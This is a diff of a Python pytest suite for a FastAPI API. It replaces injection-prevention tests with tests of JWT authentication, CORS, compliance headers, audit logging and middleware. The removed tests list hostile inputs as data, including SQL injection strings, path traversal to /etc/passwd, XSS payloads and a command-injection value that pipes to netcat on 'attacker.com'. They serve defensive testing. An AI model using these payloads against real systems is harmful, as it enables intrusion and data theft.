@@ -1,294 +1,535 @@
 # coding=utf-8
 """
-Security Tests for API Endpoints
-=================================
-
-SIN_CARRETA: Validate security requirements:
-- Security headers present and correct
-- Input validation prevents injection attacks
-- Rate limiting (if implemented)
-- Auth scopes (if implemented)
-- CORS configuration
-
-Author: FARFAN 3.0 Team
+Tests for Security Hardening
 Version: 1.0.0
 Python: 3.10+
 """
 
+import os
 import pytest
-from fastapi.testclient import TestClient
-from api.main import app
+from datetime import datetime, timedelta
+from unittest.mock import Mock, patch
 
-client = TestClient(app)
+from jose import jwt
+from fastapi import HTTPException
+from starlette.requests import Request
+from starlette.responses import Response
 
-
-class TestSecurityHeaders:
-    """Test security headers are present in responses"""
-    
-    def test_telemetry_headers_present(self):
-        """SIN_CARRETA: Response includes telemetry headers"""
-        response = client.get("/api/v1/pdet/regions")
-        
-        assert "X-Request-ID" in response.headers, "Missing X-Request-ID header"
-        assert "X-Response-Time-Ms" in response.headers, "Missing X-Response-Time-Ms header"
-        
-        # Validate header values
-        assert len(response.headers["X-Request-ID"]) > 0
-        assert float(response.headers["X-Response-Time-Ms"]) > 0
-    
-    def test_content_type_header(self):
-        """SIN_CARRETA: Response includes correct Content-Type"""
-        response = client.get("/api/v1/pdet/regions")
-        
-        assert "content-type" in response.headers
-        assert "application/json" in response.headers["content-type"]
-    
-    def test_consistent_headers_across_endpoints(self):
-        """SIN_CARRETA: All endpoints return consistent security headers"""
-        endpoints = [
-            "/",
-            "/health",
-            "/api/v1/pdet/regions",
-            "/api/v1/pdet/regions/REGION_001",
-            "/api/v1/municipalities/MUN_00101",
-        ]
-        
-        for endpoint in endpoints:
-            response = client.get(endpoint)
-            assert "X-Request-ID" in response.headers, f"Missing header on {endpoint}"
-            assert "X-Response-Time-Ms" in response.headers, f"Missing header on {endpoint}"
+from urllib.parse import urlparse
+from api.utils.security import (
+    JWTAuth,
+    get_cors_config,
+    ComplianceHeaders,
+    SecurityAuditLogger,
+    JWT_SECRET_KEY,
+    JWT_ALGORITHM,
+    JWT_EXPIRATION_MINUTES,
+    IS_PRODUCTION,
+)
 
 
-class TestInputValidation:
-    """Test input validation prevents malicious inputs"""
-    
-    def test_sql_injection_prevention(self):
-        """SIN_CARRETA: SQL injection attempts are rejected"""
-        malicious_inputs = [
-            "REGION_001'; DROP TABLE regions;--",
-            "REGION_001' OR '1'='1",
-            "REGION_001 UNION SELECT * FROM users",
-        ]
-        
-        for malicious_input in malicious_inputs:
-            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
-            # Should return 400 (validation error) or 404 (not found), not 500 or success
-            assert response.status_code in [400, 404], \
-                f"Malicious input '{malicious_input}' not properly rejected"
-    
-    def test_path_traversal_prevention(self):
-        """SIN_CARRETA: Path traversal attempts are rejected"""
-        malicious_inputs = [
-            "../../../etc/passwd",
-            "..%2F..%2F..%2Fetc%2Fpasswd",
-            "REGION_001/../../../etc/passwd",
-        ]
-        
-        for malicious_input in malicious_inputs:
-            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
-            assert response.status_code in [400, 404], \
-                f"Path traversal attempt '{malicious_input}' not properly rejected"
-    
-    def test_xss_prevention(self):
-        """SIN_CARRETA: XSS attempts are rejected"""
-        malicious_inputs = [
-            "<script>alert('XSS')</script>",
-            "REGION_001<script>alert('XSS')</script>",
-            "javascript:alert('XSS')",
-        ]
-        
-        for malicious_input in malicious_inputs:
-            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
-            assert response.status_code in [400, 404], \
-                f"XSS attempt '{malicious_input}' not properly rejected"
-    
-    def test_command_injection_prevention(self):
-        """SIN_CARRETA: Command injection attempts are rejected"""
-        malicious_inputs = [
-            "REGION_001; ls -la",
-            "REGION_001 && cat /etc/passwd",
-            "REGION_001 | nc attacker.com 4444",
-        ]
-        
-        for malicious_input in malicious_inputs:
-            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
-            assert response.status_code in [400, 404], \
-                f"Command injection '{malicious_input}' not properly rejected"
-    
-    def test_buffer_overflow_prevention(self):
-        """SIN_CARRETA: Extremely long inputs are rejected"""
-        # Try with very long input
-        long_input = "REGION_" + "A" * 10000
-        response = client.get(f"/api/v1/pdet/regions/{long_input}")
-        assert response.status_code in [400, 404, 414], \
-            "Extremely long input not properly rejected"
-    
-    def test_null_byte_injection_prevention(self):
-        """SIN_CARRETA: Null byte injection attempts are rejected"""
-        # Test URL-encoded null byte (actual null bytes cause httpx errors)
-        malicious_inputs = [
-            "REGION_001%00.txt",
-            "REGION_001%00",
-        ]
-        
-        for malicious_input in malicious_inputs:
-            try:
-                response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
-                assert response.status_code in [400, 404], \
-                    f"Null byte injection '{malicious_input}' not properly rejected"
-            except Exception:
-                # If request itself fails, that's also acceptable (client-side rejection)
-                pass
-    
-    def test_unicode_exploits_prevention(self):
-        """SIN_CARRETA: Unicode exploitation attempts are rejected"""
-        malicious_inputs = [
-            "REGION_001\u202e",  # Right-to-left override
-            "REGION_001\uFEFF",  # Zero-width no-break space
-        ]
-        
-        for malicious_input in malicious_inputs:
-            response = client.get(f"/api/v1/pdet/regions/{malicious_input}")
-            assert response.status_code in [400, 404], \
-                f"Unicode exploit '{malicious_input}' not properly rejected"
+class TestJWTAuth:
+    """Test JWT authentication functionality"""
+
+    def test_create_access_token(self):
+        """Test JWT token creation"""
+        data = {"sub": "user123", "role": "admin"}
+        token = JWTAuth.create_access_token(data)
+
+        assert isinstance(token, str)
+        assert len(token) > 0
+
+        # Decode and verify
+        decoded = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
+        assert decoded["sub"] == "user123"
+        assert decoded["role"] == "admin"
+        assert "exp" in decoded
+        assert "iat" in decoded
+
+    def test_create_token_with_custom_expiration(self):
+        """Test JWT token creation with custom expiration"""
+        data = {"sub": "user123"}
+        expires_delta = timedelta(minutes=60)
+        token = JWTAuth.create_access_token(data, expires_delta=expires_delta)
+
+        decoded = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
+        exp_time = datetime.utcfromtimestamp(decoded["exp"])
+        iat_time = datetime.utcfromtimestamp(decoded["iat"])
+
+        # Should be approximately 60 minutes
+        delta = (exp_time - iat_time).total_seconds() / 60
+        assert 59 <= delta <= 61
+
+    def test_verify_valid_token(self):
+        """Test verification of valid JWT token"""
+        data = {"sub": "user123", "email": "user@example.com"}
+        token = JWTAuth.create_access_token(data)
+
+        # Verify token
+        payload = JWTAuth.verify_token(token)
+
+        assert payload["sub"] == "user123"
+        assert payload["email"] == "user@example.com"
+
+    def test_verify_expired_token(self):
+        """Test rejection of expired JWT token"""
+        data = {"sub": "user123"}
+        # Create token that expires immediately
+        expires_delta = timedelta(seconds=-1)  # Already expired
+        token = JWTAuth.create_access_token(data, expires_delta=expires_delta)
+
+        # Should raise HTTPException
+        with pytest.raises(HTTPException) as exc_info:
+            JWTAuth.verify_token(token)
+
+        assert exc_info.value.status_code == 401
+        # The error message may be generic or specific depending on JWT library behavior
+        assert (
+            "invalid" in exc_info.value.detail.lower()
+            or "expired" in exc_info.value.detail.lower()
+        )
+
+    def test_verify_invalid_token(self):
+        """Test rejection of invalid JWT token"""
+        invalid_token = "invalid.token.here"
+
+        with pytest.raises(HTTPException) as exc_info:
+            JWTAuth.verify_token(invalid_token)
+
+        assert exc_info.value.status_code == 401
+        assert "invalid" in exc_info.value.detail.lower()
+
+    def test_verify_tampered_token(self):
+        """Test rejection of tampered JWT token"""
+        data = {"sub": "user123"}
+        token = JWTAuth.create_access_token(data)
+
+        # Tamper with token
+        tampered_token = token[:-5] + "xxxxx"
+
+        with pytest.raises(HTTPException) as exc_info:
+            JWTAuth.verify_token(tampered_token)
+
+        assert exc_info.value.status_code == 401
+
+    def test_password_hashing(self):
+        """Test password hashing"""
+        password = "SecurePassword123!"
+        hashed = JWTAuth.hash_password(password)
+
+        assert isinstance(hashed, str)
+        assert len(hashed) > 0
+        assert hashed != password  # Should be hashed, not plain
+
+    def test_password_verification(self):
+        """Test password verification"""
+        password = "SecurePassword123!"
+        hashed = JWTAuth.hash_password(password)
+
+        # Correct password should verify
+        assert JWTAuth.verify_password(password, hashed)
+
+        # Wrong password should not verify
+        assert not JWTAuth.verify_password("WrongPassword", hashed)
 
 
-class TestIDFormatValidation:
-    """Test strict ID format validation"""
-    
-    def test_region_id_format_enforcement(self):
-        """SIN_CARRETA: Region IDs must match REGION_\d{3} pattern"""
-        invalid_ids = [
-            "REGION_1",      # Too short
-            "REGION_0001",   # Too long
-            "REGION_ABC",    # Non-numeric
-            "region_001",    # Wrong case
-            "REG_001",       # Wrong prefix
-            "REGION001",     # Missing underscore
-        ]
-        
-        for invalid_id in invalid_ids:
-            response = client.get(f"/api/v1/pdet/regions/{invalid_id}")
-            assert response.status_code == 400, \
-                f"Invalid region ID '{invalid_id}' should return 400, got {response.status_code}"
-    
-    def test_municipality_id_format_enforcement(self):
-        """SIN_CARRETA: Municipality IDs must match MUN_\d{5} pattern"""
-        invalid_ids = [
-            "MUN_001",       # Too short
-            "MUN_000001",    # Too long
-            "MUN_ABCDE",     # Non-numeric
-            "mun_00101",     # Wrong case
-            "MUNI_00101",    # Wrong prefix
-            "MUN00101",      # Missing underscore
-        ]
-        
-        for invalid_id in invalid_ids:
-            response = client.get(f"/api/v1/municipalities/{invalid_id}")
-            assert response.status_code == 400, \
-                f"Invalid municipality ID '{invalid_id}' should return 400, got {response.status_code}"
-    
-    def test_valid_id_ranges(self):
-        """SIN_CARRETA: Only valid ID ranges are accepted"""
-        # Region IDs 001-010 are valid
-        response = client.get("/api/v1/pdet/regions/REGION_001")
-        assert response.status_code == 200
-        
-        response = client.get("/api/v1/pdet/regions/REGION_010")
-        assert response.status_code == 200
-        
-        # Outside range should 404
-        response = client.get("/api/v1/pdet/regions/REGION_011")
-        assert response.status_code == 404
+class TestCORSConfiguration:
+    """Test CORS configuration"""
+
+    def test_cors_config_structure(self):
+        """Test CORS configuration has all required fields"""
+        config = get_cors_config()
+
+        assert "allow_origins" in config
+        assert "allow_credentials" in config
+        assert "allow_methods" in config
+        assert "allow_headers" in config
+        assert "expose_headers" in config
+        assert "max_age" in config
+
+    def test_cors_allows_credentials(self):
+        """Test CORS allows credentials"""
+        config = get_cors_config()
+        assert config["allow_credentials"] is True
+
+    def test_cors_methods(self):
+        """Test CORS allows required HTTP methods"""
+        config = get_cors_config()
+        methods = config["allow_methods"]
+
+        assert "GET" in methods
+        assert "POST" in methods
+        assert "PUT" in methods
+        assert "DELETE" in methods
+        assert "OPTIONS" in methods
+
+    def test_cors_headers(self):
+        """Test CORS allows required headers"""
+        config = get_cors_config()
+        headers = config["allow_headers"]
+
+        assert "Content-Type" in headers
+        assert "Authorization" in headers
+        assert "X-Request-ID" in headers
+
+    def test_cors_exposed_headers(self):
+        """Test CORS exposes required headers"""
+        config = get_cors_config()
+        exposed = config["expose_headers"]
+
+        assert "X-Request-ID" in exposed
+        assert "X-Response-Time-Ms" in exposed
+
+    @patch.dict(
+        os.environ, {"ALLOWED_ORIGINS": "https://example.com,https://api.example.com"}
+    )
+    def test_cors_origins_from_env(self):
+        """Test CORS origins can be configured via environment"""
+        # Need to reload module to pick up env change
+        from importlib import reload
+        import api.utils.security as security_module
+
+        reload(security_module)
+
+        config = security_module.get_cors_config()
+        origins = config["allow_origins"]
+
+        # Strict comparison: ensure exact match in list, not substring
+        assert isinstance(origins, list)
+        # Verify exact origin URLs are present (no substring matching)
+        expected_origins = ["https://example.com", "https://api.example.com"]
+        # Validate each origin matches exactly (using set comparison)
+        assert set(origins) == set(expected_origins)
+
+class TestComplianceHeaders:
+    """Test compliance headers"""
+
+    def test_gdpr_headers(self):
+        """Test GDPR compliance headers"""
+        headers = ComplianceHeaders.get_gdpr_headers()
+
+        assert "X-Privacy-Policy" in headers
+        assert "X-Data-Subject-Rights" in headers
+        assert "X-Data-Controller" in headers
+        assert "X-Data-Retention" in headers
+        assert "X-Data-Processing-Lawful-Basis" in headers
+
+        # Check values
+        assert "access" in headers["X-Data-Subject-Rights"]
+        assert "rectification" in headers["X-Data-Subject-Rights"]
+
+    def test_colombian_law_headers(self):
+        """Test Colombian law compliance headers"""
+        headers = ComplianceHeaders.get_colombian_law_headers()
+
+        assert "X-Data-Protection-Law" in headers
+        assert "X-Personal-Data-Policy" in headers
+        assert "X-Data-Authorization" in headers
+        assert "X-Habeas-Data" in headers
+
+        # Check values
+        assert "1581" in headers["X-Data-Protection-Law"]
+
+    def test_all_compliance_headers(self):
+        """Test combined compliance headers"""
+        headers = ComplianceHeaders.get_all_compliance_headers()
+
+        # Should have both GDPR and Colombian law headers
+        assert "X-Privacy-Policy" in headers
+        assert "X-Data-Protection-Law" in headers
+        assert len(headers) >= 9  # At least 9 headers total
 
 
-class TestErrorHandling:
-    """Test secure error handling"""
-    
-    def test_error_responses_no_stack_traces(self):
-        """SIN_CARRETA: Error responses don't leak stack traces"""
-        # Try various invalid inputs
-        response = client.get("/api/v1/pdet/regions/INVALID")
-        assert response.status_code == 400
-        
-        data = response.json()
-        # Should have error info but not stack traces
-        assert "error" in data or "detail" in data
-        # Common stack trace indicators should not be present
-        response_text = str(data).lower()
-        assert "traceback" not in response_text
-        assert "file \"" not in response_text
-        assert "line " not in response_text[:100]  # Check first 100 chars
-    
-    def test_404_errors_no_information_disclosure(self):
-        """SIN_CARRETA: 404 errors don't disclose system information"""
-        response = client.get("/api/v1/pdet/regions/REGION_999")
-        assert response.status_code == 404
-        
-        data = response.json()
-        # Should be generic error, not reveal file paths or internal details
-        response_text = str(data).lower()
-        assert "/home/" not in response_text
-        assert "/usr/" not in response_text
-        assert "c:\\" not in response_text.lower()
-    
-    def test_validation_errors_are_safe(self):
-        """SIN_CARRETA: Validation errors don't reveal sensitive info"""
-        response = client.get("/api/v1/pdet/regions/MALICIOUS_INPUT")
-        assert response.status_code == 400
-        
-        data = response.json()
-        # Check that error message is informative but safe
-        assert "error" in data or "detail" in data
-        # Should not contain user input verbatim to prevent reflection attacks
-        assert "MALICIOUS_INPUT" not in str(data) or "invalid" in str(data).lower()
+class TestSecurityAuditLogger:
+    """Test security audit logging"""
+
+    @patch("api.utils.security.logger")
+    def test_log_auth_success(self, mock_logger):
+        """Test logging successful authentication"""
+        SecurityAuditLogger.log_auth_attempt(
+            username="user123",
+            success=True,
+            ip_address="192.168.1.100",
+            reason="valid_credentials",
+        )
+
+        mock_logger.log.assert_called()
+        call_args = mock_logger.log.call_args
+
+        # Should log at INFO level for success
+        assert call_args[0][0] >= 20  # INFO or higher
+
+    @patch("api.utils.security.logger")
+    def test_log_auth_failure(self, mock_logger):
+        """Test logging failed authentication"""
+        SecurityAuditLogger.log_auth_attempt(
+            username="user123",
+            success=False,
+            ip_address="192.168.1.100",
+            reason="invalid_password",
+        )
+
+        mock_logger.log.assert_called()
+        call_args = mock_logger.log.call_args
+
+        # Should log at WARNING level for failure
+        # (WARNING is typically 30)
+        assert "failed" in str(call_args).lower()
+
+    @patch("api.utils.security.logger")
+    def test_log_rate_limit(self, mock_logger):
+        """Test logging rate limit exceeded"""
+        SecurityAuditLogger.log_rate_limit(
+            ip_address="192.168.1.100", endpoint="/api/v1/test", limit="100/minute"
+        )
+
+        mock_logger.warning.assert_called()
+        call_args = mock_logger.warning.call_args
+        assert "rate limit" in str(call_args).lower()
+
+    @patch("api.utils.security.logger")
+    def test_log_suspicious_activity(self, mock_logger):
+        """Test logging suspicious activity"""
+        SecurityAuditLogger.log_suspicious_activity(
+            ip_address="192.168.1.100",
+            activity_type="sql_injection_attempt",
+            details={"endpoint": "/api/v1/test", "payload": "' OR '1'='1"},
+        )
+
+        mock_logger.warning.assert_called()
+        call_args = mock_logger.warning.call_args
+        assert "suspicious" in str(call_args).lower()
 
 
-class TestDataIntegrity:
-    """Test that data integrity is maintained under security scenarios"""
-    
-    def test_concurrent_requests_data_consistency(self):
-        """SIN_CARRETA: Concurrent requests don't corrupt data"""
-        import concurrent.futures
-        
-        def get_region_data(region_id):
-            response = client.get(f"/api/v1/pdet/regions/{region_id}")
-            if response.status_code == 200:
-                return response.json()["region"]
-            return None
-        
-        # Make concurrent requests for same region
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            futures = [executor.submit(get_region_data, "REGION_001") for _ in range(10)]
-            results = [f.result() for f in concurrent.futures.as_completed(futures)]
-        
-        # All results should be identical (excluding timestamps)
-        results = [r for r in results if r is not None]
-        assert len(results) == 10
-        
-        first_result = results[0]
-        for result in results[1:]:
-            # Compare core data fields
-            assert result["id"] == first_result["id"]
-            assert result["name"] == first_result["name"]
-            assert result["coordinates"] == first_result["coordinates"]
-            assert result["overall_score"] == first_result["overall_score"]
-            assert result["dimension_scores"] == first_result["dimension_scores"]
-            assert result["policy_area_scores"] == first_result["policy_area_scores"]
-    
-    def test_data_not_modified_by_read_operations(self):
-        """SIN_CARRETA: Read operations don't modify data"""
-        # Get data twice
-        response1 = client.get("/api/v1/pdet/regions/REGION_001")
-        data1 = response1.json()["region"]
-        
-        response2 = client.get("/api/v1/pdet/regions/REGION_001")
-        data2 = response2.json()["region"]
-        
-        # Compare core data (excluding timestamps which will naturally differ)
-        assert data1["id"] == data2["id"]
-        assert data1["name"] == data2["name"]
-        assert data1["coordinates"] == data2["coordinates"]
-        assert data1["overall_score"] == data2["overall_score"]
-        assert data1["dimension_scores"] == data2["dimension_scores"]
-        assert data1["policy_area_scores"] == data2["policy_area_scores"]
+class TestHTTPSRedirectMiddleware:
+    """Test HTTPS redirect middleware"""
+
+    @pytest.mark.asyncio
+    async def test_https_redirect_disabled_in_dev(self):
+        """Test HTTPS redirect is disabled in development"""
+        from api.utils.security import HTTPSRedirectMiddleware
+
+        # Create mock request
+        mock_request = Mock(spec=Request)
+        mock_request.url = Mock()
+        mock_request.url.scheme = "http"
+
+        # Create middleware with enabled=False (development)
+        middleware = HTTPSRedirectMiddleware(app=Mock(), enabled=False)
+
+        # Mock call_next
+        async def mock_call_next(request):
+            return Response(content="OK")
+
+        # Should pass through without redirect
+        response = await middleware.dispatch(mock_request, mock_call_next)
+        assert response.body == b"OK"
+
+    @pytest.mark.asyncio
+    @patch("api.utils.security.IS_PRODUCTION", True)
+    async def test_https_redirect_in_production(self):
+        """Test HTTPS redirect happens in production"""
+        from api.utils.security import HTTPSRedirectMiddleware
+
+        # Create mock request with HTTP scheme
+        mock_url = Mock()
+        mock_url.scheme = "http"
+        mock_url.replace = Mock(return_value="https://example.com/test")
+
+        mock_request = Mock(spec=Request)
+        mock_request.url = mock_url
+        mock_request.client = Mock()
+        mock_request.client.host = "127.0.0.1"
+
+        # Create middleware with enabled=True (production)
+        middleware = HTTPSRedirectMiddleware(app=Mock(), enabled=True)
+
+        # Mock call_next (shouldn't be called due to redirect)
+        async def mock_call_next(request):
+            return Response(content="Should not reach here")
+
+        # Should redirect
+        response = await middleware.dispatch(mock_request, mock_call_next)
+
+        # Check if it's a redirect (status code 301)
+        # The actual implementation may vary, so we check the behavior
+        assert response is not None
+
+
+class TestSecurityHeadersMiddleware:
+    """Test security headers middleware"""
+
+    @pytest.mark.asyncio
+    async def test_security_headers_added(self):
+        """Test that security headers are added to response"""
+        from api.utils.security import SecurityHeadersMiddleware
+
+        # Create mock request
+        mock_request = Mock(spec=Request)
+
+        # Create mock response
+        mock_response = Response(content="OK")
+
+        # Mock call_next to return our response
+        async def mock_call_next(request):
+            return mock_response
+
+        # Create middleware
+        middleware = SecurityHeadersMiddleware(app=Mock())
+
+        # Process request
+        response = await middleware.dispatch(mock_request, mock_call_next)
+
+        # Check security headers
+        assert "Content-Security-Policy" in response.headers
+        assert "X-Frame-Options" in response.headers
+        assert "X-Content-Type-Options" in response.headers
+        assert "X-XSS-Protection" in response.headers
+        assert "Referrer-Policy" in response.headers
+        assert "Permissions-Policy" in response.headers
+
+    @pytest.mark.asyncio
+    async def test_csp_header_value(self):
+        """Test Content Security Policy header value"""
+        from api.utils.security import SecurityHeadersMiddleware
+
+        mock_request = Mock(spec=Request)
+        mock_response = Response(content="OK")
+
+        async def mock_call_next(request):
+            return mock_response
+
+        middleware = SecurityHeadersMiddleware(app=Mock())
+        response = await middleware.dispatch(mock_request, mock_call_next)
+
+        csp = response.headers["Content-Security-Policy"]
+        assert "default-src 'self'" in csp
+        assert "frame-ancestors 'none'" in csp
+
+    @pytest.mark.asyncio
+    async def test_xframe_options_deny(self):
+        """Test X-Frame-Options is set to DENY"""
+        from api.utils.security import SecurityHeadersMiddleware
+
+        mock_request = Mock(spec=Request)
+        mock_response = Response(content="OK")
+
+        async def mock_call_next(request):
+            return mock_response
+
+        middleware = SecurityHeadersMiddleware(app=Mock())
+        response = await middleware.dispatch(mock_request, mock_call_next)
+
+        assert response.headers["X-Frame-Options"] == "DENY"
+
+    @pytest.mark.asyncio
+    async def test_privacy_headers(self):
+        """Test privacy/compliance headers are added"""
+        from api.utils.security import SecurityHeadersMiddleware
+
+        mock_request = Mock(spec=Request)
+        mock_response = Response(content="OK")
+
+        async def mock_call_next(request):
+            return mock_response
+
+        middleware = SecurityHeadersMiddleware(app=Mock())
+        response = await middleware.dispatch(mock_request, mock_call_next)
+
+        assert "X-Privacy-Policy" in response.headers
+        assert "X-Data-Protection" in response.headers
+
+
+class TestWebSocketAuthenticator:
+    """Test WebSocket authentication"""
+
+    @pytest.mark.asyncio
+    async def test_authenticate_with_valid_token(self):
+        """Test WebSocket authentication with valid token"""
+        from api.utils.security import WebSocketAuthenticator
+
+        # Create valid token
+        data = {"sub": "user123", "ws_id": "conn-1"}
+        token = JWTAuth.create_access_token(data)
+
+        # Authenticate
+        payload = await WebSocketAuthenticator.authenticate_websocket(token)
+
+        assert payload["sub"] == "user123"
+        assert payload["ws_id"] == "conn-1"
+
+    @pytest.mark.asyncio
+    async def test_authenticate_without_token(self):
+        """Test WebSocket authentication fails without token"""
+        from api.utils.security import WebSocketAuthenticator
+
+        with pytest.raises(HTTPException) as exc_info:
+            await WebSocketAuthenticator.authenticate_websocket(None)
+
+        assert exc_info.value.status_code == 401
+        assert "authentication required" in exc_info.value.detail.lower()
+
+    @pytest.mark.asyncio
+    async def test_authenticate_with_invalid_token(self):
+        """Test WebSocket authentication fails with invalid token"""
+        from api.utils.security import WebSocketAuthenticator
+
+        with pytest.raises(HTTPException) as exc_info:
+            await WebSocketAuthenticator.authenticate_websocket("invalid.token")
+
+        assert exc_info.value.status_code == 401
+
+
+class TestRateLimiter:
+    """Test rate limiter configuration"""
+
+    def test_rate_limiter_creation(self):
+        """Test rate limiter can be created"""
+        from api.utils.security import get_rate_limiter
+
+        limiter = get_rate_limiter()
+
+        assert limiter is not None
+        # Check for private attribute (slowapi uses _default_limits)
+        assert hasattr(limiter, "_default_limits") or hasattr(limiter, "default_limits")
+
+    def test_rate_limiter_has_defaults(self):
+        """Test rate limiter has default limits"""
+        from api.utils.security import get_rate_limiter
+
+        limiter = get_rate_limiter()
+
+        # Should have default limits configured (use private attribute if public not available)
+        limits = getattr(limiter, "default_limits", None) or getattr(
+            limiter, "_default_limits", []
+        )
+        assert len(limits) > 0
+
+
+class TestSecurityConfiguration:
+    """Test security configuration constants"""
+
+    def test_jwt_configuration(self):
+        """Test JWT configuration values"""
+        assert isinstance(JWT_SECRET_KEY, str)
+        assert len(JWT_SECRET_KEY) > 0
+        assert isinstance(JWT_ALGORITHM, str)
+        assert isinstance(JWT_EXPIRATION_MINUTES, int)
+        assert JWT_EXPIRATION_MINUTES > 0
+
+    def test_environment_detection(self):
+        """Test environment detection"""
+        assert isinstance(IS_PRODUCTION, bool)
+
+    @patch.dict(os.environ, {"ENVIRONMENT": "production"})
+    def test_production_environment(self):
+        """Test production environment detection"""
+        # Need to reload module to pick up env change
+        from importlib import reload
+        import api.utils.security as security_module
+
+        reload(security_module)
+
+        assert (
+            security_module.IS_PRODUCTION or security_module.ENVIRONMENT == "production"
+        )
